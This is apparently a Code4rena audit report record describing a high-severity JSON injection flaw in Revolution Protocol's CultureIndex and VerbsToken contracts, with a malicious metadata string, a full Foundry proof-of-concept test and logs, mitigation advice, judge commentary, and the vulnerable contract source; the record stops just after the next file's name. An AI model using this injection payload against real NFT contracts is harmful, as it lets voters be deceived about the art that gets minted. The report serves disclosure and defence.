{
  "Title": "[H-03] `VerbsToken.tokenURI()` is vulnerable to JSON injection attacks",
  "Content": "\n<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L209> \n\n<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L193>\n\n`CultureIndex.createPiece()` function doesn't sanitize malicious charcacters in `metadata.image` and `metadata.animationUrl`,  which would cause `VerbsToken.tokenURI()` suffering various JSON injection attack vectors.\n\n1.  If the front end APP doesn't process the JSON string properly, such as using `eval()` to parse token URI, then any malicious code can be executed in the front end. Obviously, funds in users' connected wallet, such as Metamask, might be stolen in this case.\n\n2.  Even while the front end processes securely, such as using the standard builtin `JSON.parse()` to read URI. Adversary can still exploit this vulnerability to replace art piece image/animation with arbitrary other ones after voting stage completed.\n\nThat is the final metadata used by the NFT (VerbsToken) is not the art piece users vote. This attack could be benefit to attackers, such as creating NFTs containing same art piece data with existing high price NFTs. And this attack could also make the project sufferring legal risks, such as creating NFTs with violence or pornography images.\n\nMore reference: <https://www.comparitech.com/net-admin/json-injection-guide/>\n\n### Proof of Concept\n\nAs shown of `createPiece()` function, there is no check if `metadata.image` and `metadata.animationUrl` contain malicious charcacters, such as `\"`, `:` and `,`.\n\n```solidity\nFile: src\\CultureIndex.sol\n209:     function createPiece(\n210:         ArtPieceMetadata calldata metadata,\n211:         CreatorBps[] calldata creatorArray\n212:     ) public returns (uint256) {\n213:         uint256 creatorArrayLength = validateCreatorsArray(creatorArray);\n214: \n215:         // Validate the media type and associated data\n216:         validateMediaType(metadata);\n217: \n218:         uint256 pieceId = _currentPieceId++;\n219: \n220:         /// @dev Insert the new piece into the max heap\n221:         maxHeap.insert(pieceId, 0);\n222: \n223:         ArtPiece storage newPiece = pieces[pieceId];\n224: \n225:         newPiece.pieceId = pieceId;\n226:         newPiece.totalVotesSupply = _calculateVoteWeight(\n227:             erc20VotingToken.totalSupply(),\n228:             erc721VotingToken.totalSupply()\n229:         );\n230:         newPiece.totalERC20Supply = erc20VotingToken.totalSupply();\n231:         newPiece.metadata = metadata;\n232:         newPiece.sponsor = msg.sender;\n233:         newPiece.creationBlock = block.number;\n234:         newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000;\n235: \n236:         for (uint i; i < creatorArrayLength; i++) {\n237:             newPiece.creators.push(creatorArray[i]);\n238:         }\n239: \n240:         emit PieceCreated(pieceId, msg.sender, metadata, newPiece.quorumVotes, newPiece.totalVotesSupply);\n241: \n242:         // Emit an event for each creator\n243:         for (uint i; i < creatorArrayLength; i++) {\n244:             emit PieceCreatorAdded(pieceId, creatorArray[i].creator, msg.sender, creatorArray[i].bps);\n245:         }\n246: \n247:         return newPiece.pieceId;\n248:     }\n\n```\n\nAdverary can exploit this to make `VerbsToken.tokenURI()` to return various malicious JSON objects to front end APP.\n\n```solidity\n\nFile: src\\Descriptor.sol\n097:     function constructTokenURI(TokenURIParams memory params) public pure returns (string memory) {\n098:         string memory json = string(\n099:             abi.encodePacked(\n100:                 '{\"name\":\"',\n101:                 params.name,\n102:                 '\", \"description\":\"',\n103:                 params.description,\n104:                 '\", \"image\": \"',\n105:                 params.image,\n106:                 '\", \"animation_url\": \"',\n107:                 params.animation_url,\n108:                 '\"}'\n109:             )\n110:         );\n111:         return string(abi.encodePacked(\"data:application/json;base64,\", Base64.encode(bytes(json))));\n112:     }\n\n```\n\nFor example, if attacker submit the following metadata:\n\n```solidity\nICultureIndex.ArtPieceMetadata({\n            name: 'Mona Lisa',\n            description: 'A renowned painting by Leonardo da Vinci',\n            mediaType: ICultureIndex.MediaType.IMAGE,\n            image: 'ipfs://realMonaLisa',\n            text: '',\n            animationUrl: '\", \"image\": \"ipfs://fakeMonaLisa' // malicious string injected\n        });\n```\n\nDuring voting stage, front end gets `image` field by `CultureIndex.pieces[pieceId].metadata.image`, which is `ipfs://realMonaLisa`. But, after voting complete, art piece is minted to `VerbsToken` NFT. Now, front end would query `VerbsToken.tokenURI(tokenId)` to get base64 encoded metadata, which would be:\n\n```solidity\ndata:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=\n```\n\nIn the front end, we use `JSON.parse()` to parse the above data, we get `image` as `ipfs://fakeMonaLisa`.\n![image](https://c2n.me/4jZPsiZ.png)\nImage link: <https://gist.github.com/assets/68863517/d769d7ac-db02-4e3b-94d2-dfaf3752b763>\n\nBelow is the full coded PoC:\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.22;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console2} from \"forge-std/console2.sol\";\nimport {RevolutionBuilderTest} from \"./RevolutionBuilder.t.sol\";\nimport {ICultureIndex} from \"../src/interfaces/ICultureIndex.sol\";\n\ncontract JsonInjectionAttackTest is RevolutionBuilderTest {\n    string public tokenNamePrefix = \"Vrb\";\n    string public tokenName = \"Vrbs\";\n    string public tokenSymbol = \"VRBS\";\n\n    function setUp() public override {\n        super.setUp();\n        super.setMockParams();\n\n        super.setERC721TokenParams(tokenName, tokenSymbol, \"https://example.com/token/\", tokenNamePrefix);\n\n        super.setCultureIndexParams(\"Vrbs\", \"Our community Vrbs. Must be 32x32.\", 10, 500, 0);\n\n        super.deployMock();\n    }\n\n    function testImageReplacementAttack() public {\n        ICultureIndex.CreatorBps[] memory creators = _createArtPieceCreators();\n        ICultureIndex.ArtPieceMetadata memory metadata = ICultureIndex.ArtPieceMetadata({\n            name: 'Mona Lisa',\n            description: 'A renowned painting by Leonardo da Vinci',\n            mediaType: ICultureIndex.MediaType.IMAGE,\n            image: 'ipfs://realMonaLisa',\n            text: '',\n            animationUrl: '\", \"image\": \"ipfs://fakeMonaLisa' // malicious string injected\n        });\n\n        uint256 pieceId = cultureIndex.createPiece(metadata, creators);\n\n        vm.startPrank(address(erc20TokenEmitter));\n        erc20Token.mint(address(this), 10_000e18);\n        vm.stopPrank();\n        vm.roll(block.number + 1); // ensure vote snapshot is taken\n        cultureIndex.vote(pieceId);\n\n        // 1. the image used during voting stage is 'ipfs://realMonaLisa'\n        ICultureIndex.ArtPiece memory topPiece = cultureIndex.getTopVotedPiece();\n        assertEq(pieceId, topPiece.pieceId);\n        assertEq(keccak256(\"ipfs://realMonaLisa\"), keccak256(bytes(topPiece.metadata.image)));\n\n        // 2. after being minted to VerbsToken, the image becomes to 'ipfs://fakeMonaLisa'\n        vm.startPrank(address(auction));\n        uint256 tokenId = erc721Token.mint();\n        vm.stopPrank();\n        assertEq(pieceId, tokenId);\n        string memory encodedURI = erc721Token.tokenURI(tokenId);\n        console2.log(encodedURI);\n        string memory prefix = _substring(encodedURI, 0, 29);\n        assertEq(keccak256('data:application/json;base64,'), keccak256(bytes(prefix)));\n        string memory actualBase64Encoded = _substring(encodedURI, 29, bytes(encodedURI).length);\n        string memory expectedBase64Encoded = 'eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=';\n        assertEq(keccak256(bytes(expectedBase64Encoded)), keccak256(bytes(actualBase64Encoded)));\n    }\n\n    function _createArtPieceCreators() internal pure returns (ICultureIndex.CreatorBps[] memory) {\n        ICultureIndex.CreatorBps[] memory creators = new ICultureIndex.CreatorBps[](1);\n        creators[0] = ICultureIndex.CreatorBps({creator: address(0xc), bps: 10_000});\n        return creators;\n    }\n\n    function _substring(string memory str, uint256 startIndex, uint256 endIndex)\n        internal\n        pure\n        returns (string memory)\n    {\n        bytes memory strBytes = bytes(str);\n        bytes memory result = new bytes(endIndex-startIndex);\n        for (uint256 i = startIndex; i < endIndex; i++) {\n            result[i - startIndex] = strBytes[i];\n        }\n        return string(result);\n    }\n}\n```\n</details>\n\nAnd, test logs:\n\n```solidity\n2023-12-revolutionprotocol\\packages\\revolution> forge test --match-contract JsonInjectionAttackTest -vv\n[⠑] Compiling...\nNo files changed, compilation skipped\n\nRunning 1 test for test/JsonInjectionAttack.t.sol:JsonInjectionAttackTest\n[PASS] testImageReplacementAttack() (gas: 1437440)\nLogs:\n  data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.30ms\nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n### Recommended Mitigation Steps\n\nSanitize input data according: <https://github.com/OWASP/json-sanitizer>\n\n**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167#issuecomment-1875959168)**\n\n**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167#issuecomment-1879698395):**\n > Looks like a `Medium` at the first glance, but after some thought `High` severity seems appropriate due to assets being compromised in a pretty straight-forward way.\n>\n> 1. The front-end part of the present issue is definitely QA but is part of a more severe correctly identified root cause, see point 4.\n> 2. The purpose of using IPFS is *immutability*. Thus, the art piece cannot be simply changed on the server. If users vote on an NFT where the underlying art is hosted on a normal webserver, it's user error.\n> 3. I agree that the provided example findings are QA due to lack of impact on contract/protocol level.\n> 4. The critical part of this attack is that the art piece (IPFS link) that is voted on will differ from the art piece (IPFS link) in the minted VerbsToken which makes this an issue on protocol level where assets are compromised and users will be misled as a result.\n> \n>On the one hand, users have to be careful and review their actions responsibly, but on the other hand it's any protocol's duty to protect users to a certain degree (example: slippage control). \n>\n> Here, multiple users are put at risk because of one malicious user.  \n>\n> Furthermore, due to the voting mechanism and later minting, users are exposed to a risk that is not as clear to see as if they could see the final NFT from the beginning. \n>\n> I have to draw the line somewhere and here it becomes evident that the protocol's duty to protect it's users outweighs the required user scrutiny.\n\n_Note: See full discussion [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167)._\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-12-revolutionprotocol",
  "Code": [
    {
      "filename": "packages/revolution/src/CultureIndex.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.22;\n\nimport { Ownable2StepUpgradeable } from \"@openzeppelin/contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\nimport { ReentrancyGuardUpgradeable } from \"@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol\";\n\nimport { UUPS } from \"./libs/proxy/UUPS.sol\";\nimport { VersionedContract } from \"./version/VersionedContract.sol\";\n\nimport { IRevolutionBuilder } from \"./interfaces/IRevolutionBuilder.sol\";\n\nimport { ERC20VotesUpgradeable } from \"./base/erc20/ERC20VotesUpgradeable.sol\";\nimport { MaxHeap } from \"./MaxHeap.sol\";\nimport { ICultureIndex } from \"./interfaces/ICultureIndex.sol\";\n\nimport { ERC721CheckpointableUpgradeable } from \"./base/ERC721CheckpointableUpgradeable.sol\";\nimport { EIP712Upgradeable } from \"@openzeppelin/contracts-upgradeable/utils/cryptography/EIP712Upgradeable.sol\";\nimport { Strings } from \"@openzeppelin/contracts/utils/Strings.sol\";\n\ncontract CultureIndex is\n    ICultureIndex,\n    VersionedContract,\n    UUPS,\n    Ownable2StepUpgradeable,\n    ReentrancyGuardUpgradeable,\n    EIP712Upgradeable\n{\n    /// @notice The EIP-712 typehash for gasless votes\n    bytes32 public constant VOTE_TYPEHASH =\n        keccak256(\"Vote(address from,uint256[] pieceIds,uint256 nonce,uint256 deadline)\");\n\n    /// @notice An account's nonce for gasless votes\n    mapping(address => uint256) public nonces;\n\n    // The MaxHeap data structure used to keep track of the top-voted piece\n    MaxHeap public maxHeap;\n\n    // The ERC20 token used for voting\n    ERC20VotesUpgradeable public erc20VotingToken;\n\n    // The ERC721 token used for voting\n    ERC721CheckpointableUpgradeable public erc721VotingToken;\n\n    // The weight of the 721 voting token\n    uint256 public erc721VotingTokenWeight;\n\n    /// @notice The maximum settable quorum votes basis points\n    uint256 public constant MAX_QUORUM_VOTES_BPS = 6_000; // 6,000 basis points or 60%\n\n    /// @notice The minimum vote weight required in order to vote\n    uint256 public minVoteWeight;\n\n    /// @notice The basis point number of votes in support of a art piece required in order for a quorum to be reached and for an art piece to be dropped.\n    uint256 public quorumVotesBPS;\n\n    /// @notice The name of the culture index\n    string public name;\n\n    /// @notice A description of the culture index - can include rules or guidelines\n    string public description;\n\n    // The list of all pieces\n    mapping(uint256 => ArtPiece) public pieces;\n\n    // The internal piece ID tracker\n    uint256 public _currentPieceId;\n\n    // The mapping of all votes for a piece\n    mapping(uint256 => mapping(address => Vote)) public votes;\n\n    // The total voting weight for a piece\n    mapping(uint256 => uint256) public totalVoteWeights;\n\n    // Constant for max number of creators\n    uint256 public constant MAX_NUM_CREATORS = 100;\n\n    // The address that is allowed to drop art pieces\n    address public dropperAdmin;\n\n    ///                                                          ///\n    ///                         IMMUTABLES                       ///\n    ///                                                          ///\n\n    /// @notice The contract upgrade manager\n    IRevolutionBuilder private immutable manager;\n\n    ///                                                          ///\n    ///                         CONSTRUCTOR                      ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    constructor(address _manager) payable initializer {\n        manager = IRevolutionBuilder(_manager);\n    }\n\n    ///                                                          ///\n    ///                         INITIALIZER                      ///\n    ///                                                          ///\n\n    /**\n     * @notice Initializes a token's metadata descriptor\n     * @param _erc20VotingToken The address of the ERC20 voting token, commonly referred to as \"points\"\n     * @param _erc721VotingToken The address of the ERC721 voting token, commonly the dropped art pieces\n     * @param _initialOwner The owner of the contract, allowed to drop pieces. Commonly updated to the AuctionHouse\n     * @param _maxHeap The address of the max heap contract\n     * @param _dropperAdmin The address that can drop new art pieces\n     * @param _cultureIndexParams The CultureIndex settings\n     */\n    function initialize(\n        address _erc20VotingToken,\n        address _erc721VotingToken,\n        address _initialOwner,\n        address _maxHeap,\n        address _dropperAdmin,\n        IRevolutionBuilder.CultureIndexParams memory _cultureIndexParams\n    ) external initializer {\n        require(msg.sender == address(manager), \"Only manager can initialize\");\n\n        require(_cultureIndexParams.quorumVotesBPS <= MAX_QUORUM_VOTES_BPS, \"invalid quorum bps\");\n        require(_cultureIndexParams.erc721VotingTokenWeight > 0, \"invalid erc721 voting token weight\");\n        require(_erc721VotingToken != address(0), \"invalid erc721 voting token\");\n        require(_erc20VotingToken != address(0), \"invalid erc20 voting token\");\n\n        // Setup ownable\n        __Ownable_init(_initialOwner);\n\n        // Initialize EIP-712 support\n        __EIP712_init(string.concat(_cultureIndexParams.name, \" CultureIndex\"), \"1\");\n\n        __ReentrancyGuard_init();\n\n        erc20VotingToken = ERC20VotesUpgradeable(_erc20VotingToken);\n        erc721VotingToken = ERC721CheckpointableUpgradeable(_erc721VotingToken);\n        erc721VotingTokenWeight = _cultureIndexParams.erc721VotingTokenWeight;\n        name = _cultureIndexParams.name;\n        description = _cultureIndexParams.description;\n        quorumVotesBPS = _cultureIndexParams.quorumVotesBPS;\n        minVoteWeight = _cultureIndexParams.minVoteWeight;\n        dropperAdmin = _dropperAdmin;\n\n        emit QuorumVotesBPSSet(quorumVotesBPS, _cultureIndexParams.quorumVotesBPS);\n\n        // Create maxHeap\n        maxHeap = MaxHeap(_maxHeap);\n    }\n\n    ///                                                          ///\n    ///                         MODIFIERS                        ///\n    ///                                                          ///\n\n    /**\n     *  Validates the media type and associated data.\n     * @param metadata The metadata associated with the art piece.\n     *\n     * Requirements:\n     * - The media type must be one of the defined types in the MediaType enum.\n     * - The corresponding media data must not be empty.\n     */\n    function validateMediaType(ArtPieceMetadata calldata metadata) internal pure {\n        require(uint8(metadata.mediaType) > 0 && uint8(metadata.mediaType) <= 5, \"Invalid media type\");\n\n        if (metadata.mediaType == MediaType.IMAGE)\n            require(bytes(metadata.image).length > 0, \"Image URL must be provided\");\n        else if (metadata.mediaType == MediaType.ANIMATION)\n            require(bytes(metadata.animationUrl).length > 0, \"Animation URL must be provided\");\n        else if (metadata.mediaType == MediaType.TEXT)\n            require(bytes(metadata.text).length > 0, \"Text must be provided\");\n    }\n\n    /**\n     * @notice Checks the total basis points from an array of creators and returns the length\n     * @param creatorArray An array of Creator structs containing address and basis points.\n     * @return Returns the total basis points calculated from the array of creators.\n     *\n     * Requirements:\n     * - The `creatorArray` must not contain any zero addresses.\n     * - The function will return the length of the `creatorArray`.\n     */\n    function validateCreatorsArray(CreatorBps[] calldata creatorArray) internal pure returns (uint256) {\n        uint256 creatorArrayLength = creatorArray.length;\n        //Require that creatorArray is not more than MAX_NUM_CREATORS to prevent gas limit issues\n        require(creatorArrayLength <= MAX_NUM_CREATORS, \"Creator array must not be > MAX_NUM_CREATORS\");\n\n        uint256 totalBps;\n        for (uint i; i < creatorArrayLength; i++) {\n            require(creatorArray[i].creator != address(0), \"Invalid creator address\");\n            totalBps += creatorArray[i].bps;\n        }\n\n        require(totalBps == 10_000, \"Total BPS must sum up to 10,000\");\n\n        return creatorArrayLength;\n    }\n\n    /**\n     * @notice Creates a new piece of art with associated metadata and creators.\n     * @param metadata The metadata associated with the art piece, including name, description, image, and optional animation URL.\n     * @param creatorArray An array of creators who contributed to the piece, along with their respective basis points that must sum up to 10,000.\n     * @return Returns the unique ID of the newly created art piece.\n     *\n     * Emits a {PieceCreated} event for the newly created piece.\n     * Emits a {PieceCreatorAdded} event for each creator added to the piece.\n     *\n     * Requirements:\n     * - `metadata` must include name, description, and image. Animation URL is optional.\n     * - `creatorArray` must not contain any zero addresses.\n     * - The sum of basis points in `creatorArray` must be exactly 10,000.\n     */\n    function createPiece(\n        ArtPieceMetadata calldata metadata,\n        CreatorBps[] calldata creatorArray\n    ) public returns (uint256) {\n        uint256 creatorArrayLength = validateCreatorsArray(creatorArray);\n\n        // Validate the media type and associated data\n        validateMediaType(metadata);\n\n        uint256 pieceId = _currentPieceId++;\n\n        /// @dev Insert the new piece into the max heap\n        maxHeap.insert(pieceId, 0);\n\n        ArtPiece storage newPiece = pieces[pieceId];\n\n        newPiece.pieceId = pieceId;\n        newPiece.totalVotesSupply = _calculateVoteWeight(\n            erc20VotingToken.totalSupply(),\n            erc721VotingToken.totalSupply()\n        );\n        newPiece.totalERC20Supply = erc20VotingToken.totalSupply();\n        newPiece.metadata = metadata;\n        newPiece.sponsor = msg.sender;\n        newPiece.creationBlock = block.number;\n        newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000;\n\n        for (uint i; i < creatorArrayLength; i++) {\n            newPiece.creators.push(creatorArray[i]);\n        }\n\n        emit PieceCreated(pieceId, msg.sender, metadata, newPiece.quorumVotes, newPiece.totalVotesSupply);\n\n        // Emit an event for each creator\n        for (uint i; i < creatorArrayLength; i++) {\n            emit PieceCreatorAdded(pieceId, creatorArray[i].creator, msg.sender, creatorArray[i].bps);\n        }\n\n        return newPiece.pieceId;\n    }\n\n    /**\n     * @notice Checks if a specific voter has already voted for a given art piece.\n     * @param pieceId The ID of the art piece.\n     * @param voter The address of the voter.\n     * @return A boolean indicating if the voter has voted for the art piece.\n     */\n    function hasVoted(uint256 pieceId, address voter) external view returns (bool) {\n        return votes[pieceId][voter].voterAddress != address(0);\n    }\n\n    /**\n     * @notice Returns the voting power of a voter at the current block.\n     * @param account The address of the voter.\n     * @return The voting power of the voter.\n     */\n    function getVotes(address account) external view override returns (uint256) {\n        return _getVotes(account);\n    }\n\n    /**\n     * @notice Returns the voting power of a voter at the current block.\n     * @param account The address of the voter.\n     * @return The voting power of the voter.\n     */\n    function getPastVotes(address account, uint256 blockNumber) external view override returns (uint256) {\n        return _getPastVotes(account, blockNumber);\n    }\n\n    /**\n     * @notice Calculates the vote weight of a voter.\n     * @param erc20Balance The ERC20 balance of the voter.\n     * @param erc721Balance The ERC721 balance of the voter.\n     * @return The vote weight of the voter.\n     */\n    function _calculateVoteWeight(uint256 erc20Balance, uint256 erc721Balance) internal view returns (uint256) {\n        return erc20Balance + (erc721Balance * erc721VotingTokenWeight * 1e18);\n    }\n\n    function _getVotes(address account) internal view returns (uint256) {\n        return _calculateVoteWeight(erc20VotingToken.getVotes(account), erc721VotingToken.getVotes(account));\n    }\n\n    function _getPastVotes(address account, uint256 blockNumber) internal view returns (uint256) {\n        return\n            _calculateVoteWeight(\n                erc20VotingToken.getPastVotes(account, blockNumber),\n                erc721VotingToken.getPastVotes(account, blockNumber)\n            );\n    }\n\n    /**\n     * @notice Cast a vote for a specific ArtPiece.\n     * @param pieceId The ID of the ArtPiece to vote for.\n     * @param voter The address of the voter.\n     * @dev Requires that the pieceId is valid, the voter has not already voted on this piece, and the weight is greater than the minimum vote weight.\n     * Emits a VoteCast event upon successful execution.\n     */\n    function _vote(uint256 pieceId, address voter) internal {\n        require(pieceId < _currentPieceId, \"Invalid piece ID\");\n        require(voter != address(0), \"Invalid voter address\");\n        require(!pieces[pieceId].isDropped, \"Piece has already been dropped\");\n        require(!(votes[pieceId][voter].voterAddress != address(0)), \"Already voted\");\n\n        uint256 weight = _getPastVotes(voter, pieces[pieceId].creationBlock);\n        require(weight > minVoteWeight, \"Weight must be greater than minVoteWeight\");\n\n        votes[pieceId][voter] = Vote(voter, weight);\n        totalVoteWeights[pieceId] += weight;\n\n        uint256 totalWeight = totalVoteWeights[pieceId];\n\n        // TODO add security consideration here based on block created to prevent flash attacks on drops?\n        maxHeap.updateValue(pieceId, totalWeight);\n        emit VoteCast(pieceId, voter, weight, totalWeight);\n    }\n\n    /**\n     * @notice Cast a vote for a specific ArtPiece.\n     * @param pieceId The ID of the ArtPiece to vote for.\n     * @dev Requires that the pieceId is valid, the voter has not already voted on this piece, and the weight is greater than the minimum vote weight.\n     * Emits a VoteCast event upon successful execution.\n     */\n    function vote(uint256 pieceId) public nonReentrant {\n        _vote(pieceId, msg.sender);\n    }\n\n    /**\n     * @notice Cast a vote for a list of ArtPieces.\n     * @param pieceIds The IDs of the ArtPieces to vote for.\n     * @dev Requires that the pieceIds are valid, the voter has not already voted on this piece, and the weight is greater than the minimum vote weight.\n     * Emits a series of VoteCast event upon successful execution.\n     */\n    function voteForMany(uint256[] calldata pieceIds) public nonReentrant {\n        _voteForMany(pieceIds, msg.sender);\n    }\n\n    /**\n     * @notice Cast a vote for a list of ArtPieces pieceIds.\n     * @param pieceIds The IDs of the ArtPieces to vote for.\n     * @param from The address of the voter.\n     * @dev Requires that the pieceIds are valid, the voter has not already voted on this piece, and the weight is greater than the minimum vote weight.\n     * Emits a series of VoteCast event upon successful execution.\n     */\n    function _voteForMany(uint256[] calldata pieceIds, address from) internal {\n        uint256 len = pieceIds.length;\n        for (uint256 i; i < len; i++) {\n            _vote(pieceIds[i], from);\n        }\n    }\n\n    /// @notice Execute a vote via signature\n    /// @param from Vote from this address\n    /// @param pieceIds Vote on this list of pieceIds\n    /// @param deadline Deadline for the signature to be valid\n    /// @param v V component of signature\n    /// @param r R component of signature\n    /// @param s S component of signature\n    function voteForManyWithSig(\n        address from,\n        uint256[] calldata pieceIds,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external nonReentrant {\n        bool success = _verifyVoteSignature(from, pieceIds, deadline, v, r, s);\n\n        if (!success) revert INVALID_SIGNATURE();\n\n        _voteForMany(pieceIds, from);\n    }\n\n    /// @notice Execute a batch of votes via signature, each with their own signature\n    /// @param from Vote from these addresses\n    /// @param pieceIds Vote on these lists of pieceIds\n    /// @param deadline Deadlines for the signature to be valid\n    /// @param v V component of signatures\n    /// @param r R component of signatures\n    /// @param s S component of signatures\n    function batchVoteForManyWithSig(\n        address[] memory from,\n        uint256[][] calldata pieceIds,\n        uint256[] memory deadline,\n        uint8[] memory v,\n        bytes32[] memory r,\n        bytes32[] memory s\n    ) external nonReentrant {\n        uint256 len = from.length;\n        require(\n            len == pieceIds.length && len == deadline.length && len == v.length && len == r.length && len == s.length,\n            \"Array lengths must match\"\n        );\n\n        for (uint256 i; i < len; i++) {\n            if (!_verifyVoteSignature(from[i], pieceIds[i], deadline[i], v[i], r[i], s[i])) revert INVALID_SIGNATURE();\n        }\n\n        for (uint256 i; i < len; i++) {\n            _voteForMany(pieceIds[i], from[i]);\n        }\n    }\n\n    /// @notice Utility function to verify a signature for a specific vote\n    /// @param from Vote from this address\n    /// @param pieceIds Vote on this pieceId\n    /// @param deadline Deadline for the signature to be valid\n    /// @param v V component of signature\n    /// @param r R component of signature\n    /// @param s S component of signature\n    function _verifyVoteSignature(\n        address from,\n        uint256[] calldata pieceIds,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal returns (bool success) {\n        require(deadline >= block.timestamp, \"Signature expired\");\n\n        bytes32 voteHash;\n\n        voteHash = keccak256(abi.encode(VOTE_TYPEHASH, from, pieceIds, nonces[from]++, deadline));\n\n        bytes32 digest = _hashTypedDataV4(voteHash);\n\n        address recoveredAddress = ecrecover(digest, v, r, s);\n\n        // Ensure to address is not 0\n        if (from == address(0)) revert ADDRESS_ZERO();\n\n        // Ensure signature is valid\n        if (recoveredAddress == address(0) || recoveredAddress != from) revert INVALID_SIGNATURE();\n\n        return true;\n    }\n\n    /**\n     * @notice Fetch an art piece by its ID.\n     * @param pieceId The ID of the art piece.\n     * @return The ArtPiece struct associated with the given ID.\n     */\n    function getPieceById(uint256 pieceId) public view returns (ArtPiece memory) {\n        require(pieceId < _currentPieceId, \"Invalid piece ID\");\n        return pieces[pieceId];\n    }\n\n    /**\n     * @notice Fetch the list of votes for a given art piece.\n     * @param pieceId The ID of the art piece.\n     * @return An array of Vote structs for the given art piece ID.\n     */\n    function getVote(uint256 pieceId, address voter) public view returns (Vote memory) {\n        require(pieceId < _currentPieceId, \"Invalid piece ID\");\n        return votes[pieceId][voter];\n    }\n\n    /**\n     * @notice Fetch the top-voted art piece.\n     * @return The ArtPiece struct of the top-voted art piece.\n     */\n    function getTopVotedPiece() public view returns (ArtPiece memory) {\n        return pieces[topVotedPieceId()];\n    }\n\n    /**\n     * @notice Fetch the number of pieces\n     * @return The number of pieces\n     */\n    function pieceCount() external view returns (uint256) {\n        return _currentPieceId;\n    }\n\n    /**\n     * @notice Fetch the top-voted pieceId\n     * @return The top-voted pieceId\n     */\n    function topVotedPieceId() public view returns (uint256) {\n        require(maxHeap.size() > 0, \"Culture index is empty\");\n        //slither-disable-next-line unused-return\n        (uint256 pieceId, ) = maxHeap.getMax();\n        return pieceId;\n    }\n\n    /**\n     * @notice Admin function for setting the quorum votes basis points\n     * @dev newQuorumVotesBPS must be greater than the hardcoded min\n     * @param newQuorumVotesBPS new art piece drop threshold\n     */\n    function _setQuorumVotesBPS(uint256 newQuorumVotesBPS) external onlyOwner {\n        require(newQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS, \"CultureIndex::_setQuorumVotesBPS: invalid quorum bps\");\n        emit QuorumVotesBPSSet(quorumVotesBPS, newQuorumVotesBPS);\n\n        quorumVotesBPS = newQuorumVotesBPS;\n    }\n\n    /**\n     * @notice Current quorum votes using ERC721 Total Supply, ERC721 Vote Weight, and ERC20 Total Supply\n     * Differs from `GovernerBravo` which uses fixed amount\n     */\n    function quorumVotes() public view returns (uint256) {\n        return\n            (quorumVotesBPS * _calculateVoteWeight(erc20VotingToken.totalSupply(), erc721VotingToken.totalSupply())) /\n            10_000;\n    }\n\n    /**\n     * @notice Pulls and drops the top-voted piece.\n     * @return The top voted piece\n     */\n    function dropTopVotedPiece() public nonReentrant returns (ArtPiece memory) {\n        require(msg.sender == dropperAdmin, \"Only dropper can drop pieces\");\n\n        ICultureIndex.ArtPiece memory piece = getTopVotedPiece();\n        require(totalVoteWeights[piece.pieceId] >= piece.quorumVotes, \"Does not meet quorum votes to be dropped.\");\n\n        //set the piece as dropped\n        pieces[piece.pieceId].isDropped = true;\n\n        //slither-disable-next-line unused-return\n        maxHeap.extractMax();\n\n        emit PieceDropped(piece.pieceId, msg.sender);\n\n        return pieces[piece.pieceId];\n    }\n\n    ///                                                          ///\n    ///                   CULTURE INDEX UPGRADE                  ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and that the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {\n        // Ensure the new implementation is a registered upgrade\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}"
    },
    {
      "filename": "packages/revolution/src/VerbsToken.sol",
